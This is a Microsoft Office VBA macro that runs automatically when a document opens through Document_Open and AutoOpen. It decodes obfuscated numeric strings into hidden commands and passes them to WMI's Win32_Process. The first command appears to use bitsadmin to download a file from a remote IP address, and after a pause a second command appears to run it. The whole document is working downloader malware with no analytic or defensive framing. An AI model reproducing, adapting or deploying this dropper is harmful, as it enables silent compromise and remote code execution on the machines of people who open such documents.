#If VBA7 Then
    Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal milliseconds As LongPtr) 'MS Office 64 Bit
#Else
    Public Declare Sub Sleep Lib "kernel32" (ByVal milliseconds as Long) 'MS Office 32 Bit
#End If

Public Function SplitString(StringToSplit As String, n As Long) As String()
    Dim i As Long, arrCounter As Long
    Dim tmp() As String

    ReDim tmp(0 To CLng(Len(StringToSplit) / n))

    For i = 1 To Len(StringToSplit) Step n
        tmp(arrCounter) = Mid(StringToSplit, i, n)
        arrCounter = arrCounter + 1
    Next i

    SplitString = tmp
End Function

Function ReverseString(EncodedCommand As String) As String
    Dim PayLoadAscii As String
    Dim PayLoad As String
    Dim arr_TotalList() As String

    PayLoad = Join(SplitString(EncodedCommand, 3), Chr(44))
    PayLoad = Left(PayLoad, Len(PayLoad) - 1)
    arr_TotalList() = Split(PayLoad, Chr(44))

    For i = 0 To UBound(arr_TotalList())
         PayLoadAscii = Chr(arr_TotalList(i) - 240) & PayLoadAscii
    Next i
    ReverseString = PayLoadAscii
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim VerifyExecution As String
    Dim ExecDownload As String
    Dim ExecShell As String

    ExecDownload = ReverseString("34834936028634033733833235534735533732433235535935134035034532733229830727234834936028634033733828728829528629729228629629428" _
& "92862902972892872872983523563563442723483373493543513502723613563453543513453543522872723403373513483503593513402872723103263" _
& "13305297323289289306292272354341342355350337354356287272350345349340337355356345338")
    GetObject(ReverseString("298355356349343349350345359")).Get(ReverseString("355355341339351354320335290291350345327")).Create ExecDownload, Null, Null, pid

    sleep(15000)

    ExecShell = ReverseString("34834936028634033733833235534735533732433235535935134035034532733229830727234136034128634034834535733835534933229728929128829" _
& "12862882862923583322922943473543513593413493373543103323243093182863563423513553513543393453173323553593513403503453273322983" _
& "07")
    GetObject(ReverseString("298355356349343349350345359")).Get(ReverseString("355355341339351354320335290291350345327")).Create ExecShell, Null, Null, pid

End Sub
